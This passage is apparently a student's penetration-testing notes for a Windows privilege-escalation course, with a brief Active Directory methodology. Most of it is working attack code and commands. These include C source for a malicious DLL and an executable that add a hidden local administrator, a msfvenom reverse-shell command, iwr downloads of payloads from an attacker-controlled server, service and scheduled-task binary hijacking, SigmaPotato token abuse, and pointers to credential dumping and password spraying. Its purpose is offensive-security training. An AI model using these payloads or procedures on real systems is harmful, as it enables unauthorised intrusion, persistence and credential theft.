move C:\path\to\binary\svc.exe C:\somewhere\else\svc.exe
move shell.exe C:\path\to\binary\svc.exe

#Restart Service
#If not possible, see if reboot priv is enabled and if svc autoruns
net stop <svc>
net start <svc>

#Catch shell on listener
```

___
Automated tool 

PowerUp.ps1
	checks for priv esc vectors

host via http server
	`cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .`
	`python3 -m http.server 80`

Transfer
	`iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

Use
	`powershell -ep bypass`
	`.\PowerUp.ps1
	`Get-ModifiableServiceFile`
		the output shows what appears to be vulnerable
		shows file path
		the principle
		if we have perms to restart the service

AbuseFunction
	built-in function to replace the binary and restart it (if we have the permissions)
	default behavior
		creates user john:Password123!
		adds to local Administrators group
	`Install-ServiceBinary -Name 'mysql'`
		this is the syntax to use but we recieve an error
		service binary file not modifiable by current user
			but we have F access (full)
		Examine behavior to see why AbuseFunction is throwing an error
```
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath                IdentityReference Permissions
--------------                ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath     IdentityReference                Permissions
--------------     -----------------                -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 

PS C:\Users\dave> $ModifiableFiles
```
Our investigation shows that we should never blindly trust or rely on the output of automated tools. However, PowerUp is a great tool to identify potential privilege escalation vectors, which can be used to automatically check if the vulnerability can be exploited


##### DLL Hijacking

User often does not have permissions to permissions to replace binaries

Dynamic Link Libraries (DLL) provide functionality to programs or the Windows OS
	provide a way for devs to use existing functionality without reinventing the wheel
	Think of Shared Objects in Unix

Several methods to exploit DLLs

1.Instead of overwriting the binary, we merely overwrite a DLL the service binary uses
	like last section
	service/app might not work due to missing DLL functionality
	but still could lead to code execution

2.Hijack the DLL Search order
	another method
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```
A special case 
	when there is a missing DLL, we can exploit by replacing a malicious DLL in a path of the DLL search order
	Demonstartion
		RDP as _steve_ and password _securityIsNotAnOption++++++_

READ THIS PLEASEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
```
NOTE:

Before proceeding, you should know that you need to MIMIC how the app would be run on the target.

For instance, if an .exe is run via `net start`, you should do the same on your WINPREP machine using procmon. That way you can find the proper DLLs to abuse

Create service via sc:
	sc.exe create "<name>" binpath= "C:\path\to\<service.exe>"
	net start <name>
```
Demonstration of Hijacking DLL Search order
	Enumerate installed apps
		`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
			Notice FileZilla 3.63.1
			online resources show it contains a DLL hijacking vuln
	Display Permissions of FIleZilla binary
		`echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'`
		`type 'C:\FileZilla\FileZilla FTP Client\test.txt'`
			we can create files
	Process Monitor (ProcMon)
		goal is to identify all DLLS loaded by FIleZilla
		need admin privileges
		We can also copy it to a local machine to do this in a real scenario
			here we will simulate
			`c:\tools\Procmon
			Procmon.exe
			backupadmin:admin123admin123!
	Add filter for Procmon
		Filter > Filter
		Process Name is BetaServ.exe then Include
		Add
		![Figure 5: Add Filter for filezilla.exe](https://static.offsec.com/offsec-courses/PEN-200/imgs/winprivesc/430e1aa80d980c8e9160be549733996c-privesc_svcdll_pmfilter.png)
		Clear all current events with Clear button in the top row
		![Figure 6: Clear the current logged events](https://static.offsec.com/offsec-courses/PEN-200/imgs/winprivesc/5c7bfb44d40076cc45e5ce66c5b34bd1-privesc_svcdll_clear.png)
		We can see it tries to locate a file `TextShaping.dll` but fails to do so
		![Figure 8: Resulting events after applying the filters](https://static.offsec.com/offsec-courses/PEN-200/imgs/winprivesc/2108c3ff37a75c50a6d43d6ceb963e5b-privesc_svcdll_dllsearch_results.png)
		Consider additional filters 
			Result is NAME NOT FOUND
			Operation is CreateFile
			example
			![[Pasted image 20250607233609.png]]
	Create DLL
Here is a code example of a basic DLL in C++
```
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Here is a modified malicious DLL which creates a user and adds them as a local admin
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user hackerman password123! /add");
  	    i = system ("net localgroup administrators hackerman /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Created
	Now lets cross compile this
		`x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
	Transfer compiled DLL to location we identified in ProcMon
		`iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
	Verify
		`net user`
		`net localgroup administrators`
	Done!

if its a service...
	`net stop <service>`
	`net start <service>`
	:D

if its a scheduled app... it will just run eventually
##### Unquoted Service Paths

If a service runs from a binary but we do not have FULL/MODIFY rights over it, we can still potentially abuse it if its absolute path contains spaces and we have WRITE/APPEND perms

Example Workflow
```powershell
# List all services with binary path
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# Determine if there are any services running from paths with spaces
wmic service get name,pathname,startmode |  findstr /i /v "C:\Windows\\" | findstr /i /v """

# EXAMPLE identified service
ExampleService    C:\Program Files\My Program\A cool service\service.exe    Auto

# run icacls on each directory until one found with WD/AD/F perms etc...
icacls C:\
icacls "C:\Program Files\"
icacls "C:\Program Files\My Program"
icacls "C:\Program Files\My Program\A cool service"

# The following shows the executable NAME and path we would write to of each path if we find an appendable directory
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\A.exe

# Create malicious executable (multiple options)
1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.161 LPORT=80 -f exe -o <name>.exe

2. Add user (preferred) # Please see adduser.c code below

# Restart Service (2 options, both require perms)
1. Stop-Service ExampleService
   Start-Service ExampleService
   or
   Restart-Service ExampleService

3. shutdown /r /t 0 # requires SeShutdownPrivilege AND Auto startmode
```

adduser.c
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hackerman password123! /add");
  i = system ("net localgroup administrators hackerman /add");
  
  return 0;
}
```
Compile
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
Verify
```cmd
net user
net localgroup administrators
```


PowerUp.ps1 Alternative
```powershell
# transfer
iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

# Run
powershell -ep bypass
.\PowerUp.ps1
Get-UnquotedService

# AbuseFunction for Automated takeover
Write-ServiceBinary -Name 'ExampleService' -Path "C:\Program Files\Enterprise Apps\Example.exe"
Restart-Service ExampleService

# Verify as necessary
```


#### Abusing Other Windows Components

##### Scheduled Tasks
```
Some tasks get triggered by us running something... Keep that in mind
```
Windows uses Task Scheduler to execute automated tasks, like clean up activities or update management

3 important pieced of info
	Task is executed as which user account (principal)?
	What triggers are specified for the task?
	What actions are executed when one or more triggers are met?

List all schedules tasks
	`schtasks /query /fo LIST /v
	or
	PS `Get-ScheduledTask`
	`Get-ScheduledTask | Select-Object Author,Trigger,Action,TaskName,TaskPath,Source,Principal | fl`
		PAY ATTENTION TO AUTHOR -- LOOK FOR USERS

Hunt for scheduled tasks for specific users...
	`Get-ScheduledTask | Where-Object -Property Author -match <user> | fl *`

TaskScheduler (GUI)
	we can see tasks, who the author is, their trigger, what they do, etc

Display permissions of executable
	`icacls C:\Path\file.exe`
___

Demonstration of exploiting this
	List all scheduled tasks
		`schtasks /query /fo LIST /v
			C:\Users\steve\Pictures\BackendCacheCleanup.exe
			Created by `daveadmin
	Display permissions of task
		`icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe`
		(F)
		steve and offsec have full permissions 
	Craft malicious C file to add user and add to admin group
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hackerman password123! /add");
  i = system ("net localgroup administrators hackerman /add");
  
  return 0;
}
```
ok
	Compile
		`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
	Transfer
		start http server
		`iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe`
		`move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak`
		`move .\BackendCacheCleanup.exe .\Pictures\`
	Once scheduled task is executed again, dave2 is created, added to local admin group

##### Using Exploits

In this section, we will list 3 different kinds of exploits leading to priv esc and then show two of them in an example

###### Application Based Vulnerabilities

See Locating Public Exploits module

###### Kernel Vulnerabilities

Can be used for priv esc

Can easily crash a system, so be careful in real-world engagements. 

Demonstration
	Check Privileges
		`whoami /priv`
	Enumerate versions of WIndows
		`systeminfo`
			record the OS version
		`Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
			security patches
		Using build version, go to `Microsoft Security Response Center` under Security Vulnerabilities
			we locate public exploit code for CVE-2023-29360
			patch is deployed as KB5027215 which is not present on tatrget
	Compile POC you find
		might need to cross compile based on the system you are using
	Run exploit


###### Abuse Windows Privileges

SeImpersonatePrivilege
	leverage token with another security context
	We will look at this as the example

Others that can be abused `#See HTB for additional references to this`
	SeBackupPrivilege
	SeAssignPrimaryToken
	SeLoadDriver
	SeDebug

Named Pipes
	a method for local or remote inter-process communication
	when a client connects to a named pipe, the server can leverage SeImpersonatePrivilege to impersonate this client after capturing the authentication from the connection process
	We can impersonate the user 


Demonstration
`#SigmaPotato, a variation of potato priv esc to coerce SYSTEM into conencting to a controlled named pipe, and using SeImpersonatePrivilege to execute commands`
	Connect to target
		assumed breach
		`nc 192.168.50.220 4444
	Enumerate privileges
		`whoami /priv`
		SeImpersonatePrivilege
	Download SigmaPotato
		`wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe`
		host
			`python3 -m http.server 80`
	Transfer to target
		PS `iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe
	Add user
		`.\SigmaPotato "net user dave4 lab /add"`
		verify
			`net user`
	Add to local admin group
		`.\SigmaPotato "net localgroup Administrators dave4 /add"`
		verify
			`net localgroup Administrators`

`NOTE: There are other variants in the Potato family`
Potatos for PrivEsc
	https://jlajara.gitlab.io/Potatoes_Windows_Privesc
	SweetPotato is a collection of various native Windos PrivEsc technights to get SYSTEM
	https://github.com/CCob/SweetPotato


## Active Directory

```
Prior to any of this, consider if you have the correct permissions needed... also consider running command prompt as administrator if you are ABLE
```

Pre-Foothold?
	`impacket-GetUserSPNs -request -dc-ip $IP <domain>/svc_tgs
		might require password

Collect Bloodhound data
	Transfer sharphound.ps1
		powershell -ep bypass
		run
		invoke-bloudhound -collectionmethod All
	OR
	Transfer sharphound.exe
		run
	transfer back zip file via base64
		see cheat sheet
	OR
	nxc ldap ([[Netexec]]) / bloodhound-python ([[Bloodhound (legacy)|Bloodhound (legacy)]])
	THEN
	neo4j
	Enum computers
		MATCH (m:Computer) RETURN m
			save to computers.txt file
			`nslookup <FQDN>
				with ligolo...
	Enum users
		MATCH (m:User) Return m
			save to users.txt file
	Run pre-built queries to find attack paths
	Consult this zip file as you begin gaining access to these users

Manual Enumeration
	If bloodhound is useless, you may be able to manually enumerate
	PowerView.ps1

[[AD Attacks]]
	Do this whenever but ideally post mimikatz just so we have an order to things
	Depending on bloodhound, some account may be susceptible to kerberoasting or asreproasting
	View AD Attack note i added to methodology notes
	Check Shortest path to DA to see what rights owned users have
		VERY IMPORTANT
		dacl/genericwrite? we can abuse GPO 
		see notes in AD Attacks
	kerberoast svc accounts
	then
	targeted kerberoasting
		modify passwords alternatively (if able to)

creds but cant auth with winrm?
	smb?
	can you dump sam, ntds etc with impacket or nxc ldap?
	Also consider bloodhound-python

Specific Impacket tools you commonly use beyond just nxc ldap (e.g., psexec.py, wmiexec.py, getnpusers.py, getusermessagingspn.py).

## Post-Exploitation

Dump everything you can

Mimikatz one-liner

Bloodhound (if on domain machine)
	Powerview.ps1 can be used to manually enumerate

AD attacks
	kerberoasting
	asreproasting
	tickets

ligolo-ng
	begin nmap scan of internal machines

History of Privileged users
	`Get-History
	`(Get-PSReadlineOption).HistorySavePath
		cd to path and look at files, strings, etc...

IIS folder (if there is one)

Git Commits

## Pivoting

Once you have new passwords, usernames, hashes, added them all to files

`tldr nxc <protocol>`

then password spray

repeat every time there are new creds

ALSO
	if 5985 is open
	try evil-winrm
	EVEN IF NETWORK SAYS THE PASS DONT WORK
		not always accurate